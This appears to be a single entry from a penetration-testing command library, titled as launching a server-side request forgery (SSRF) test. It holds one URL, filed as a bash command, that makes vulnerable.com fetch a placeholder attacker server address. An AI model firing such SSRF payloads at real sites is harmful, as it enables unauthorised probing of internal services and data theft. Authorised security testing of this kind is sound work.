---
id: aac9561e-5519-4e25-b608-bc49040e8d3d
name: Launch SSRF pointing to vulnerable.com
type: command
executor: bash
data: http://vulnerable.com/index.php?url=http://YOUR_SERVER_IP
output: null
created_at: '2023-04-06T03:56:37.657192+00:00'
updated_at: '2023-04-10T20:24:12.441111+00:00'
---

# Launch SSRF pointing to vulnerable.com

```bash
http://vulnerable.com/index.php?url=http://YOUR_SERVER_IP
```
